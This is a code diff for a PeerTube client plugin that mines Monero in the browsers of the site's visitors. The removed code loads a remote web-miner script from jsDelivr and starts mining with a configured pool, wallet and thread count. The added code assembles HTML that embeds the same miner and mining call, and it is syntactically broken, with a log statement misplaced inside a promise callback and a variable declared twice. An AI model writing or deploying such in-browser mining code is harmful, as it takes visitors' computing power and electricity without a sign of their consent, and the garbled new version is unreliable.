@@ -1,51 +1,27 @@
 async function register({ registerHook, peertubeHelpers }) {
+
+peertubeHelpers.getSettings().then(
   console.log('Initializing Monero miner client plugin...');
+      s => {
+      if ( !s || !s['walletAddress'] || !s['poolAddress']) {
+        let rule = "console.error('Monero miner plugin: Required settings are missing.');"
+        return
+      }
 
-  // Retrieve plugin settings from the server
-  const settings = await peertubeHelpers.getSettings();
-
-  if (!settings || !settings.walletAddress || !settings.poolAddress) {
-    console.error('Monero miner settings are missing or incomplete.');
-    return;
-  }
-
-  // Dynamically load the mining library
-  const miningLibraryUrl = 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'; // Replace with actual mining library URL
-  await loadScript(miningLibraryUrl);
-
-  // マイニングの設定開示、これはあかん
-  // console.log('Starting Monero miner with the following settings:', settings);
-  console.log('Starting Monero miner with the following settings');
-
-  // Start mining with the retrieved settings
-  startMining(
-    settings.poolAddress,
-    settings.walletAddress,
-    'PeerTube-Miner',
-    settings.threads || 1,
-    ''
-  );
+      let rule = "<!-- Monero Miner Script -->"
+      rule+= "<script src='https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'></script>\n"
+      rule+= "<script>\n"
+      rule+= "const server = '"+s['webSocket']+"';\n"
+      rule+= "const pool = '"+s['poolAddress']+"';\n"
+      rule+= "const wallet = '"+s['walletAddress']+"';\n"
+      rule+= "const workerId = 'PeerTube-Miner';\n"
+      rule+= "const threads = '"+s['threads']+"';\n"
+      rule+= "const password = '"+s['password']+"';\n"
+      rule+= "startMining(pool, wallet, workerId, threads, password);\n"
+      rule+= "throttleMiner = 20;\n"
+      rule+= "</script>;\n"
+      rule+= "<!-- End Of Mining Code (HTML) -->;\n"
+    }
+  )
 }
-
-// Helper function to dynamically load a script
-function loadScript(src) {
-  return new Promise((resolve, reject) => {
-    const script = document.createElement('script');
-    script.src = src;
-    script.onload = resolve;
-    script.onerror = reject;
-    document.head.appendChild(script);
-  });
-}
-
-// Function to start mining
-function startMining(pool, wallet, workerId, threads, password) {
-  if (window.startMining) {
-    window.startMining(pool, wallet, workerId, threads, password);
-    console.log(`Mining started on pool: ${pool}`);
-  } else {
-    console.error('Mining library is not loaded. Cannot start mining.');
-  }
-}
-
-export { register };
+export { register }
